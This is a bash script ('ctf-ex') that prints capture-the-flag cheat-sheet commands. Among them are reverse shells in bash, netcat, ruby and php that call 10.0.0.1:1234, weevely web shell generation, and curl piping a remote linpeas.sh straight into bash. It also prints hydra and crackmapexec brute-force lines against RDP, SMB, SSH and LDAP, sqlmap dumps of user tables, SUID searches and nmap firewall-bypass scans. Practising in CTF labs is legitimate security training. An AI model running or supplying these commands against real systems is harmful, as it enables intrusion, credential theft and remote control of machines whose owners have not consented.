#!/bin/bash
#TODO: reverse-shell/tcpdump/tshark/ssh/links
#
# Can display examples for how commands are structured
# Following commands can be used:
#	- curl
#	- hydra
#	- nmap
# 	- gobuster
# 	- tty (How to upgrade a shell to tty)
#	- john
#	- ping (Set up a ping listen)
#	- find
#	- pwntools
#	- sqlmap
# 	- crackmapexec
# 	- smbclient.py
#	- mount
# Usage: ctf-ex <CMD>
#

option=$(tr '[:upper:]' '[:lower:]' <<< "$1")  # Convert command choice to lowercase

if [[ $option == "-h" || $# != 1 ]]; then
	echo "Usage: ctf-ex <CMD>
Commands implemented
	- reverse-shell
	- nmap
	- hydra
	- curl
	- gobuster
	- crackmapexec
	- tty
	- john
	- ping
	- find
	- pwntools
	- sqlmap
	- smbclient.py
	- mount"

elif [[ $option == "crackmapexec" ]]; then
	echo "Bruteforce smb
	crackmapexec smb 10.10.10.192 -u users -p pass
Bruteforce winrm
	crackmapexec winrm 10.10.10.192 -u users -p pass"

elif [[ $option == "gobuster" ]]; then
	echo "Enumerate directories on HTTP:
	gobuster dir --wordlist /usr/share/wordlists/dirb/big.txt --url <URL> [-x <EXTENSIONS, CSV>] [-o <OUTFILE>]
Enumerate directories on HTTPS:
	gobuster dir -k --wordlist /usr/share/wordlists/dirb/big.txt --url <URL> [-x <EXTENSIONS, CSV>] [-o <OUTFILE>]
Enumerate vhosts:
	gobuster vhost --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt --url <URL>"

elif [[ $option == "tty" ]]; then
	echo "Fully upgrading to TTY shell
	python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
	ctrl+z
	echo $TERM && tput lines && tput cols
	stty raw -echo
	fg
	export SHELL=bash
	export TERM=xterm-256color
	stty rows 24 columns 121"

elif [[ $option == "john" ]]; then
	echo "Cracking hash
	john --wordlist=/usr/share/wordlists/rockyou.txt hash_file"

elif [[ $option == "mount" ]]; then
	echo "Mount a shared folder
	mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share"

elif [[ $option == "ping" ]]; then
	echo "Setting up listener for pings
	tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo"

elif [[ $option == "find" ]]; then
	echo "Finding a file and dismissing permission denied messages
	find / -type f -name \"keyword\" 2>&1 | grep -v \"Permission denied\"
Finding all SUID and SGID files in the file system
	find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
Finding all readable by user files 
	find / -type f -readable
Finding all writable by user files
	find / -type d -writable 
	"

elif [[ $option == "pwntools" ]]; then
	echo "Making a remote connection
	io = remote('ip', port)
Setting debug mode
	context.log_level = 'DEBUG'
Pattern generation
	cyclic(x)
Pattern Finding
	cyclic_find(0xadress)
URL encoding
	urlencode(\"string\")
packing to big-endian
	pack(1, endian='big')
loading ELF files
	e = ELF('/path/to/file')		
more details
	https://github.com/Gallopsled/pwntools-tutorial
	"

elif [[ $option == "smbclient.py" ]]; then
	echo "Login
	smbclient.py DOMAIN/USERNAME:PASS@IP"

elif [[ $option == "sqlmap" ]]; then
	echo "SQLi testing from saved request from burp
	sqlmap --level 5 --risk 3 --batch -r <FILE>
SQLi from GET request
	sqlmap --level 5 --risk 3 --batch -u <URL>
SQLI for specefic parameters	
	sqlmap --level 5 --risk 3 --batch -u <URL> --method \"POST\" --data=\"parm_1=value&param_n=value\"
GET SQL Shell
	sqlmap --dbms=mysql -u \"<URL>\" --sql-shell
LIST all databases
	sqlmap -u \"<URL>\" --dbs
LIST all tables in a database
	sqlmap -u \"<URL>\" -D site_db --tables	
Dump the contents of a DB table
	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users –dump
List all columns in a table
	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users --columns
	"
elif [[ $option == "curl" ]]; then
	echo "POST parameters
	curl --data \"email=test@test.com&password=test\" <URL>
Specify user agent
	curl -A \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" <URL>
OUTPUT response header to stdout 
	curl -i http://10.10.10.10/profile.php
Follow redirect 302
	curl -L http://10.10.10.10/profile.php		
Pipe a remote script directly to bash 
	curl -sSk \"http://10.10.10.10/linpeas.sh\" | bash
Adding additonal headrs 
	curl -H \"X-Header: value\" <URL>
	"

elif [[ $option == "hydra" ]]; then 
	echo "Brute windows RDP
	hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
Brute SMB users with rockyou
	hydra -L usernames.txt -P passwords.txt $ip smb -V -f
Brute LDAP users with rockyou.txt 
	hydra -L users.txt -P passwords.txt $ip ldap2 -V -f
Brute HTTP GET login
	hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
Bute ssh on port 22
	hydra $ip -s 22 ssh -l -P big_wordlist.txt
Brute ssh using list of users and passwords 
	hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
Check more here:
	https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/			
	"	
elif [[ $option == "nmap" ]]; then
	echo "Scan from predifined list
	nmap -iL list.txt
scan top X ports
	nmap –top-ports X 192.168.1.1
scan all 65535 ports 
	nmap -p- 192.168.1.1
scan a subnet 
	nmap 192.168.1.0/24	
scan selected ports and ignore discorvery 
	nmap -Pn -F 192.168.1.1
scan using tcp connect 
	nmap -sT 192.168.1.1
aggressive service detection
	nmap -sV --version-intensity 5 192.168.1.1
ligher banner grabbing detection
	nmap -sV --version-intensity 0 192.168.1.1
Scan with a set of scripts
	nmap -sV --script=smb* 192.168.1.1
use diminutive fragmented IP packets
	nmap -f 192.168.1.1
Specify the size (need to be multiple of 16)
	nmap --mtu 16 192.168.1.1
use firewall bypass script
	nmap -sS -T5 192.168.1.1 --script firewall-bypass		
check more here: 
	https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
	https://www.stationx.net/nmap-cheat-sheet/
	https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/
	https://dzone.com/articles/firewall-bypassing-techniques-with-nmap-and-hping3				
"
elif [[ $option == "reverse-shell" ]]; then
	echo "bash reverse-shell
	bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
netcat
	nc -e /bin/sh 10.0.0.1 1234
ruby 
	ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'
php	
	php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'	
weevely web shell
	weevely generate <password> <path>
	weevely <URL> password
"

 
fi